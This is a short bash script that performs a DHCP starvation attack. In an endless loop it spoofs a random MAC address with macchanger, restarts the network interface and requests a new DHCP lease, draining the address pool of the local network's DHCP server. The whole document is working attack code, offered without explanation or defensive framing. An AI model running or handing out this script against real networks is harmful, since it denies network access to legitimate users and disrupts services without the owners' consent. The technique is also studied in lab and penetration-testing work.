#!/bin/bash

if [[ -z $1 ]]; then
   interface='eth0'
else
   interface=$1
fi

PIDFile="/tmp/dhcp-starvation.dhclient.${interface}.pid"
LEASEFile="/tmp/dhcp-starvation.dhclient.${interface}.lease"
CONFIGFile="/tmp/dhcp-starvation.dhclient.conf"

echo 'initial-interval 1;' > "${CONFIGFile}"

rm -f "${PIDFile}"

while true; do
      # We kill every dhclient process
      [ -e "${PIDFile}" ] && kill -9 $(cat "${PIDFile}")
      rm -f "${PIDFile}" "${LEASEFile}"

      # We disable our interface
      ip link set "${interface}" down
      #ifconfig "${interface}" down

      # We switch our MAC address for out interface
      macchanger -a "${interface}" | grep '^New MAC:'

      # We enable again our interface
      ip link set "${interface}" up
      #ifconfig "${interface}" up

      # We get a new DHCP Lease
      dhclient -v "${interface}" -pf "${PIDFile}" -lf "${LEASEFile}" -cf "${CONFIGFile}" 2>&1 | grep DHCPACK
done
